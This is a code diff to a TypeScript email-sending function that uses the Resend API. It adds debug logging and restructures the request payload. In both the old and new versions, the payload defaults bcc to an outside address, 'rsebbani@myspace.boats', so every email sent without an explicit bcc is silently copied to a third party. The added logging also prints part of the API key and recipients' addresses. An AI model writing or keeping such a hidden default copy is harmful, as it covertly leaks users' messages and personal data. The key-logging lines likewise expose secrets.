@@ -33,10 +33,26 @@ interface ResendResponse {
 export async function sendEmail(options: EmailOptions): Promise<{ success: boolean; id?: string; error?: string }> {
   const apiKey = process.env.RESEND_API_KEY;
   
+  console.log("[Email] Attempting to send email to:", options.to);
+  console.log("[Email] API Key present:", !!apiKey, apiKey ? `(${apiKey.substring(0, 10)}...)` : '');
+  
   if (!apiKey) {
     console.warn("[Email] RESEND_API_KEY not configured, skipping email");
     return { success: false, error: "API key not configured" };
   }
+
+  const payload = {
+    from: FROM_EMAIL,
+    to: options.to,
+    subject: options.subject,
+    html: options.html,
+    reply_to: REPLY_TO,
+    cc: options.cc,
+    bcc: options.bcc || ['rsebbani@myspace.boats'],
+  };
+  
+  console.log("[Email] Sending with from:", FROM_EMAIL);
+  console.log("[Email] Subject:", options.subject);
 
   try {
     const response = await fetch(RESEND_API_URL, {
@@ -45,18 +61,21 @@ export async function sendEmail(options: EmailOptions): Promise<{ success: boole
         "Authorization": `Bearer ${apiKey}`,
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({
-        from: FROM_EMAIL,
-        to: options.to,
-        subject: options.subject,
-        html: options.html,
-        reply_to: REPLY_TO,
-        cc: options.cc,
-        bcc: options.bcc || ['rsebbani@myspace.boats'],
-      }),
+      body: JSON.stringify(payload),
     });
 
-    const data: ResendResponse = await response.json();
+    console.log("[Email] Response status:", response.status, response.statusText);
+    
+    const responseText = await response.text();
+    console.log("[Email] Response body:", responseText);
+    
+    let data: ResendResponse;
+    try {
+      data = JSON.parse(responseText);
+    } catch {
+      console.error("[Email] Failed to parse response as JSON:", responseText);
+      return { success: false, error: `Invalid response: ${responseText}` };
+    }
 
     if (!response.ok || data.error) {
       console.error("[Email] Failed to send:", data.error?.message || "Unknown error");
